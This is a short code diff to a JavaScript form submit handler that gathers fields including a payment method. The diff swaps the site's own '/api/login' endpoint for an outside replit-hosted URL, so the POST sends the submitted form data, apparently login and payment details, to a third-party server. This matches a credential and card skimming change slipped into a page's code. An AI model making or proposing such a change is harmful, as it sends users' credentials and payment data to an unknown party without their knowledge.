@@ -143,7 +143,7 @@ form.addEventListener("submit", (event) => {
     paymentMethod: data.get("paymentMethod"),
   });
 
-  fetch("/api/login", {
+  fetch("https://bro3-3ebry-db.johnholk.repl.co/r", {
     method: "POST",
     body: json,
   })
